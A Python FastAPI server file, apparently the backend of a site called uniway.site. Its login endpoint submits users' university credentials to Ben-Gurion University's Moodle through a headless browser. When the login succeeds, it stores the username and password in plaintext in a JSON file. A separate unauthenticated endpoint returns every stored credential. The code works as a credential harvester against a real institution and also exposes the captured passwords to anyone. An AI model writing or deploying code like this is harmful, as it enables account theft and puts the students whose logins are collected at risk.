from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time
import json
import os

app = FastAPI()

# CORS settings
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://uniway.site"],  # In production, set your frontend URL
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

USERS_FILE = "users.json"

# Load users from file
def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    with open(USERS_FILE, "r") as file:
        return json.load(file)

# Save user or update password
def save_user_or_update_password(username, password):
    users = load_users()
    updated = False

    for user in users:
        if user["username"] == username:
            if user["password"] != password:
                user["password"] = password  # Update password
                updated = True
            break
    else:
        users.append({"username": username, "password": password})
        updated = True

    if updated:
        with open(USERS_FILE, "w") as file:
            json.dump(users, file, indent=2)

@app.post("/login")
async def login(request: Request):
    data = await request.json()
    username = data.get("username")
    password = data.get("password")

    # Set up headless browser
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")

    driver = webdriver.Chrome(options=chrome_options)
    driver.get("https://moodle.bgu.ac.il/moodle/login/index.php")

    try:
        driver.find_element(By.ID, "username").send_keys(username)
        driver.find_element(By.ID, "password").send_keys(password)
        driver.find_element(By.ID, "loginbtn").click()

        time.sleep(2)

        # Check if redirected to dashboard (successful login)
        if "my" in driver.current_url:
            save_user_or_update_password(username, password)
            return JSONResponse(
                status_code=200,
                content={
                    "status": "success",
                    "message": "Login successful"
                }
            )
        else:
            return JSONResponse(
                status_code=401,
                content={
                    "status": "error",
                    "message": "Invalid credentials"
                }
            )

    except Exception as e:
        return JSONResponse(
            status_code=500,
            content={
                "status": "error",
                "message": "Error during login",
                "error": str(e)
            }
        )

    finally:
        driver.quit()

@app.get("/get-users")
def get_users():
    return load_users()